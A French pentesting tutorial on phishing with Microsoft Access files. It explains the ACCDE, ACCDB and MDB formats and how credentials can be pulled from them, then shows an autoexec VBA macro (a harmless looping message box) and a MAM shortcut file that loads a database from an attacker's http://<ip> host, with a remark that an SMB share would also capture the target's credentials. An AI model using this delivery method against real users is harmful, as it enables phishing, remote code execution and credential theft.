Prérequis :

-   Programmation en VBA
-   Compréhension général des services Microsoft en Pentesting.
    

Comprendre le Sevice Access :

les fichiers avec pour extension ACCDE (Microsoft Access Execute Only Database) sont des fichiers utilisés pour protéger un fichier ACCDB. Il remplace le format MDE qui sécurise un fichier MDB utilisé par les anciennes versions d’Access. les permissions ne permettent pas de lire le code des macros (permissions Execute). C'est à dire que le code VBA d’un fichier ACCDE est enregistré de manière à empêcher quiconque de le voir ou de le modifier.

![](https://media.discordapp.net/attachments/909429116707680256/919240781158567986/unknown.png)

les differences majeur entre ACCDB et MDB c'est que ACCDB ne prennent pas en charge la sécurité ou la réplication au niveau de l’utilisateur alors que MDB oui, par contre ACCDB utilise un système cryptographique plus avancée via les API windows.

Exemple de fichier MDB :

![](https://media.discordapp.net/attachments/909429116707680256/919245188092801054/unknown.png)

Comme vous pouvez le voir les données sont partiellement chiffré on peut obtenir ces données : `Driver.SQLServer.SERVER\SQLEXPRESS` `UID: CEOuser` `PWD: CEOpassword`

Exemple de fichier ACCDB :

![](https://media.discordapp.net/attachments/909429116707680256/919246921380552704/unknown.png)

c'est illisible mais nous pouvons malgé tout avoir accès à certaines données via `strings`

![](https://media.discordapp.net/attachments/713142876241920000/919261585929809980/unknown.png)

MDB et ACCDB sont des bases de données de Microsoft Access, mais MDB n'est plus utilisé dans les versions récentes. Chaque DB contiennent différents objets comme les tables, requêtes, formulaires, états, ou encore des macros et du code VBA ( Visual Basic ). Les fichiers correspondant aux bases de données Access sont souvent lié à un fichier appellé LACCDB ou LDB pour les ancienne versions. ces fichiers sont des fichiers de verrouillage qui permettent de déterminer quels enregistrements sont verrouillés dans une base de données partagée et par qui ils sont verrouillés.

![](https://media.discordapp.net/attachments/909429116707680256/919249514563518495/unknown.png?width=522&height=343)

le but du phishing via Access peux permettre à un attaquant de gérérer un code VBA malveillant en ACCDE et en autoexec pour que au moment de l'execution la victime soit automatiquement redirigé vers le serveurs de l'attaquant.

pour l'exemple nous allons faire un code VBA innoffensif qui va faire une boucle sur la pop up.

```vb
Public Function main()
	func
End Function

Sub func()
	do
	  Msgbox"RISTBS LE AKER PRO",0+16,"An0nym0us"
	loop
End Sub
```

![](https://media.discordapp.net/attachments/713142876241920000/919256210790838352/unknown.png?width=974&height=192)

pour mettre une macro et mettre l'autoexec, aller dans `Créer`->`Macro` et ajouter l'action `ExcuterCode` puis mettre la fonction principal de ton code pour ma part c'est `main()` et après `Ctrl-S` nommez le _autoexec_.

Utilisation de MAM sur un serveur HTTP mais on peut utiliser un partage SMB ce qui va en meme temps volé les creds de la cible.

```powershell
[Shortcut Properties]
AccessShortcutVersion=1
DatabaseName=phishing.accdb
ObjectName=autoexec
ObjectType=Macro
Computer=DESKTOP-3IEFJ48
DatabasePath=http://<ip>/phishing.accde
EnableRemote=0
CreationTime= 1d7ee7f7e171f3a
Icon=265
```

![](https://media.discordapp.net/attachments/713142876241920000/919274348836171818/unknown.png?width=974&height=440)

Lors de l'execution du MAM voila ce qu'il ce passe.

![](https://media.discordapp.net/attachments/713142876241920000/919251022973653062/unknown.png?width=974&height=215)
